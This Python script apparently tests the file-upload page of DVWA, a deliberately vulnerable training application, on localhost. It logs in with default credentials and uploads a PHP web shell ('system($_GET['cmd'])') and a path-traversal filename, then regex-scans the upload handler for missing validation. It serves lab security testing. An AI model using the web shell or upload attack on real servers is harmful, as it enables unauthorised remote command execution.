import requests
from bs4 import BeautifulSoup
import re

class SecurityMisconfigurationTester:
    def __init__(self, base_url):
        self.base_url = base_url
        self.session = requests.Session()
        self.csrf_token = None

    def login(self, username, password):
        """Logs into DVWA and sets the session."""
        self.get_csrf_token()
        if not self.csrf_token:
            return False
        data = {
            'username': username,
            'password': password,
            'Login': 'Login',
            'user_token': self.csrf_token
        }
        try:
            response = self.session.post(f"{self.base_url}/login.php", data=data)
            response.raise_for_status()
            if 'Welcome to Damn Vulnerable Web Application!' in response.text:
                print("Login successful")
                return True
            else:
                print("Login failed")
                return False
        except requests.RequestException as e:
            print(f"Error during login attempt: {e}")
            return False

    def get_csrf_token(self):
        """Retrieves the CSRF token from the login page."""
        try:
            response = self.session.get(f"{self.base_url}/login.php")
            response.raise_for_status()
            soup = BeautifulSoup(response.text, 'html.parser')
            token_input = soup.find('input', {'name': 'user_token'})
            if token_input:
                self.csrf_token = token_input['value']
                print(f"CSRF token obtained: {self.csrf_token}")
            else:
                print("CSRF token not found.")
        except requests.RequestException as e:
            print(f"Error accessing the login page: {e}")

    def upload_file(self, file_name, file_content):
        """Attempts to upload a file to DVWA and checks for vulnerabilities."""
        try:
            self.get_csrf_token()
            files = {'uploaded': (file_name, file_content)}
            data = {
                'Upload': 'Upload',
                'user_token': self.csrf_token
            }
            response = self.session.post(f"{self.base_url}/vulnerabilities/upload/", files=files, data=data)

            response.raise_for_status()
            if "succesfully uploaded!" in response.text:
                print("[VULNERABILITY] File upload successful without proper validation")
            else:
                print("[SECURE] File upload validation in place")
        except requests.RequestException as e:
            print(f"Error during file upload attempt: {e}")

    def test_file_type_validation(self):
        """Test case for file type validation."""
        print("Testing file type validation...")
        php_payload = "<?php echo 'Vulnerable'; ?>"
        self.upload_file("payload.php", php_payload)

    def test_path_traversal(self):
        """Test case for path traversal vulnerability."""
        print("Testing path traversal vulnerability...")
        try:
            self.get_csrf_token()
            # Attempt to upload a file with a path traversal payload
            files = {'uploaded': ("../../etc/passwd", "data")}
            data = {
                'Upload': 'Upload',
                'user_token': self.csrf_token
            }
            response = self.session.post(f"{self.base_url}/vulnerabilities/upload/", files=files, data=data)
            response.raise_for_status()
            if "succesfully uploaded!" in response.text:
                print("[VULNERABILITY] Path traversal vulnerability detected")
            else:
                print("[SECURE] No path traversal vulnerability detected")
        except requests.RequestException as e:
            print(f"Error during path traversal test: {e}")

    def test_web_shell_upload(self):
        """Test case for web shell upload vulnerability."""
        print("Testing web shell upload vulnerability...")
        web_shell_payload = "<?php system($_GET['cmd']); ?>"
        self.upload_file("shell.php", web_shell_payload)

    def analyze_php_code(self, php_code):
        """Analyzes PHP code for specific vulnerabilities related to security misconfiguration."""
        vulnerabilities = []

        # 1. Bypassing File Type Restrictions: Check for missing file extension validation
        bypass_type_pattern = re.compile(r"\$target_path\s*\.\s*=\s*basename\(\s*\$_FILES\s*\[\s*'uploaded'\s*\]\s*\[\s*'name'\s*\]\s*\)\s*;")
        bypass_type_vulns = bypass_type_pattern.findall(php_code)
        if bypass_type_vulns:
            for match in bypass_type_vulns:
                line_number = php_code.count('\n', 0, php_code.index(match)) + 1
                vulnerabilities.append((match, line_number, "Missing file type validation, allowing file type bypass."))

        # 2. Uploading a Web Shell: Check for direct file move without validation
        webshell_pattern = re.compile(r"move_uploaded_file\s*\(\s*\$_FILES\s*\[\s*'uploaded'\s*\]\s*\[\s*'tmp_name'\s*\]\s*,\s*\$target_path\s*\)")
        webshell_vulns = webshell_pattern.findall(php_code)
        if webshell_vulns:
            for match in webshell_vulns:
                line_number = php_code.count('\n', 0, php_code.index(match)) + 1
                vulnerabilities.append((match, line_number, "Direct file move without validation, potentially allowing web shell upload."))

        # 3. Path Traversal Vulnerability: Check for improper handling of file paths
        path_traversal_pattern = re.compile(r"\$target_path\s*\.\s*=\s*basename\(\s*\$_FILES\s*\[\s*'uploaded'\s*\]\s*\[\s*'name'\s*\]\s*\)\s*;")
        path_traversal_vulns = path_traversal_pattern.findall(php_code)
        if path_traversal_vulns:
            for match in path_traversal_vulns:
                line_number = php_code.count('\n', 0, php_code.index(match)) + 1
                vulnerabilities.append((match, line_number, "Potential for path traversal if not properly validated."))

        # Print found vulnerabilities
        if vulnerabilities:
            print("[VULNERABILITIES FOUND]")
            for vuln, line_number, description in vulnerabilities:
                print(f"\n{description} at line {line_number}:\n{vuln.strip()}")
        else:
            print("[SECURE] No obvious security misconfigurations found in PHP code.")

def main():
    base_url = "http://127.0.0.1/dvwa"  # Adjust this to your DVWA URL
    print(f"Attempting to connect to DVWA at: {base_url}")
    
    tester = SecurityMisconfigurationTester(base_url)

    # Login to DVWA with default credentials
    if tester.login('admin', 'password'):
        print("\nTest Case 1: File Type Validation")
        tester.test_file_type_validation()

        print("\nTest Case 2: Path Traversal")
        tester.test_path_traversal()

        print("\nTest Case 3: Web Shell Upload")
        tester.test_web_shell_upload()

        # Analyzing provided PHP code for vulnerabilities
        php_code = '''
        <?php
        if( isset( $_POST[ 'Upload' ] ) ) {
            // Where are we going to be writing to?
            $target_path  = DVWA_WEB_PAGE_TO_ROOT . "hackable/uploads/";
            $target_path .= basename( $_FILES[ 'uploaded' ][ 'name' ] );

            // Can we move the file to the upload folder?
            if( !move_uploaded_file( $_FILES[ 'uploaded' ][ 'tmp_name' ], $target_path ) ) {
                // No
                echo '<pre>Your image was not uploaded.</pre>';
            }
            else {
                // Yes!
                echo "<pre>{$target_path} succesfully uploaded!</pre>";
            }
        }
        ?>
        '''
        tester.analyze_php_code(php_code)

if __name__ == "__main__":
    main()
